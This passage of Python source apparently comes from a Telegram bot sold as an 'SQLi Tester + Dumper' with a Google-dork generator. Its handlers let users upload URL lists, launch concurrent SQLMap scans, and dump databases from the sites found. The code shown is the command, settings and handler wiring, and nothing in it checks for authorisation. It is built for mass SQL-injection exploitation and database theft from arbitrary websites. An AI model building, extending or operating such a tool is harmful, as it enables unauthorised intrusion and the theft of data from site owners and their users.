    await update.message.reply_text(
        f"ℹ️ *About — v{VERSION}*\n\n"
        f"🛡️ SQLi Tester + Dumper\n"
        f"🎯 Dork Generator v4.1\n"
        f"📋 20 templates across 5 categories\n"
        f"🆕 Placeholders: (KW) (PF) (PT) (DE) (SF) (NB) (CM)\n"
        f"⚡ Optimized boolean detection & streaming generation\n\n"
        f"Powered by python-telegram-bot · aiohttp · SQLMap",
        parse_mode="Markdown"
    )

async def status_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_scan_state(uid)
    file_st = f"📄 {os.path.basename(state['file_path'])}" if state.get("file_path") else "❌ None"
    scan_st = "🔄 Running" if state["scanning"] else "⏹️ Idle"
    await update.message.reply_text(
        f"📊 *SQLi Status*\n"
        f"Scan/Dump : {scan_st}\n"
        f"File      : {file_st}\n"
        f"Filter    : {state['filter_intensity']}\n"
        f"Concurrent: {state['concurrent']}\n"
        f"Timeout   : {state['timeout']}s\n"
        f"Threads   : {state['threads']}",
        parse_mode="Markdown"
    )

async def myconfig_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_scan_state(uid)
    await update.message.reply_text(
        f"⚙️ *SQLi Settings*\n"
        f"Filter intensity : {state['filter_intensity']}\n"
        f"Concurrent req.  : {state['concurrent']}\n"
        f"HTTP timeout     : {state['timeout']}s\n"
        f"SQLMap threads   : {state['threads']}",
        parse_mode="Markdown"
    )

async def cancel_scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_scan_state(uid)
    if not state["scanning"]:
        await update.message.reply_text("⏹️ Nothing is running.")
        return
    state["cancel_event"].set()
    await update.message.reply_text("🛑 Cancel signal sent. Will stop after current URL.")

async def setfilter_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or args[0].lower() not in ("low", "medium", "high"):
        await update.message.reply_text("❌ Usage: /setfilter <low|medium|high>")
        return
    state = get_scan_state(update.effective_user.id)
    state["filter_intensity"] = args[0].lower()
    await update.message.reply_text(f"✅ Filter set to: {state['filter_intensity']}")

async def setconcurrent_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        val = int(context.args[0])
        if 1 <= val <= 200:
            get_scan_state(update.effective_user.id)["concurrent"] = val
            await update.message.reply_text(f"✅ Concurrent requests set to: {val}")
        else:
            raise ValueError
    except:
        await update.message.reply_text("❌ Usage: /setconcurrent <1-200>")

async def settimeout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        val = int(context.args[0])
        if 1 <= val <= 60:
            get_scan_state(update.effective_user.id)["timeout"] = val
            await update.message.reply_text(f"✅ HTTP timeout set to: {val}s")
        else:
            raise ValueError
    except:
        await update.message.reply_text("❌ Usage: /settimeout <1-60>")

async def setthreads_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        val = int(context.args[0])
        if 1 <= val <= 10:
            get_scan_state(update.effective_user.id)["threads"] = val
            await update.message.reply_text(f"✅ SQLMap threads set to: {val}")
        else:
            raise ValueError
    except:
        await update.message.reply_text("❌ Usage: /setthreads <1-10>")

async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_scan_state(uid)
    if not state.get("file_path"):
        await update.message.reply_text("❌ No file uploaded. Send a .txt file first.")
        return
    if state["scanning"]:
        await update.message.reply_text("⚠️ Already running. Use /cancel to stop.")
        return
    asyncio.create_task(run_scan(update, context, uid))

async def dump_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_scan_state(uid)
    if state["scanning"]:
        await update.message.reply_text("⚠️ Already running. Use /cancel first.")
        return
    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text("❌ Reply to a .txt file with /dump")
        return
    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only .txt files are supported.")
        return
    tmp_path = await download_document(doc, context)
    asyncio.create_task(run_dump_direct(update, context, uid, tmp_path, doc.file_name))

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only .txt files are accepted for SQLi scanning.")
        return
    uid = update.effective_user.id
    state = get_scan_state(uid)
    if state.get("file_path"):
        try:
            os.unlink(state["file_path"])
        except:
            pass
    tmp_path = await download_document(doc, context)
    state["file_path"] = tmp_path
    state["scanning"] = False
    await update.message.reply_text(f"✅ '{doc.file_name}' uploaded.\n/scan – start two-phase scan\n/dump – reply to this message to dump directly")

# ========================= MAIN =========================

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    # SQLi commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("about", about))
    app.add_handler(CommandHandler("status", status_sqli))
    app.add_handler(CommandHandler("myconfig", myconfig_sqli))
    app.add_handler(CommandHandler("scan", scan_cmd))
    app.add_handler(CommandHandler("dump", dump_cmd))
    app.add_handler(CommandHandler("cancel", cancel_scan_cmd))
    app.add_handler(CommandHandler("setfilter", setfilter_cmd))
    app.add_handler(CommandHandler("setconcurrent", setconcurrent_cmd))
    app.add_handler(CommandHandler("settimeout", settimeout_cmd))
    app.add_handler(CommandHandler("setthreads", setthreads_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Dork commands
    app.add_handler(CommandHandler("dork",          dork_cmd))
    app.add_handler(CommandHandler("quickdork",     quickdork_cmd))
    app.add_handler(CommandHandler("preview",       preview_cmd))
    app.add_handler(CommandHandler("config",        config_cmd))
    app.add_handler(CommandHandler("stats",         stats_cmd))
    app.add_handler(CommandHandler("setkeywords",   setkeywords_cmd))
    app.add_handler(CommandHandler("addkeywords",   addkeywords_cmd))
    app.add_handler(CommandHandler("clearkeywords", clearkeywords_cmd))
    app.add_handler(CommandHandler("settemplates",  settemplates_cmd))
    app.add_handler(CommandHandler("category",      category_cmd))
    app.add_handler(CommandHandler("setparams",     setparams_cmd))
    app.add_handler(CommandHandler("settlds",       settlds_cmd))
    app.add_handler(CommandHandler("setoperators",  setoperators_cmd))
    app.add_handler(CommandHandler("setextensions", setextensions_cmd))
    app.add_handler(CommandHandler("setnumbers",    setnumbers_cmd))
    app.add_handler(CommandHandler("setcms",        setcms_cmd))
    app.add_handler(CommandHandler("toggleshuffle", toggleshuffle_cmd))
    app.add_handler(CommandHandler("togglededupe",  togglededupe_cmd))
    app.add_handler(CommandHandler("reset",         reset_cmd))
    app.add_handler(CommandHandler("exportconfig",  exportconfig_cmd))
    app.add_handler(CommandHandler("importconfig",  importconfig_cmd))
    app.add_handler(CommandHandler("generate",      generate_all_cmd))
    app.add_handler(CommandHandler("gen",           gen_cmd))
    app.add_handler(CommandHandler("estimate",      estimate_cmd))
    app.add_handler(CommandHandler("setpreset",     setpreset_cmd))

    # Callbacks
    app.add_handler(CallbackQueryHandler(cb_template,   pattern=r"^tmpl:"))
    app.add_handler(CallbackQueryHandler(cb_category,   pattern=r"^cat:"))
    app.add_handler(CallbackQueryHandler(cb_cfg_nav,    pattern=r"^cfg_nav:"))
    app.add_handler(CallbackQueryHandler(cb_list_toggle, pattern=r"^(param|tld|op|ext):"))

    logging.info(f"Bot v{VERSION} started. SQLMap: {SQLMAP_BIN} (exists={os.path.isfile(SQLMAP_BIN)})")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
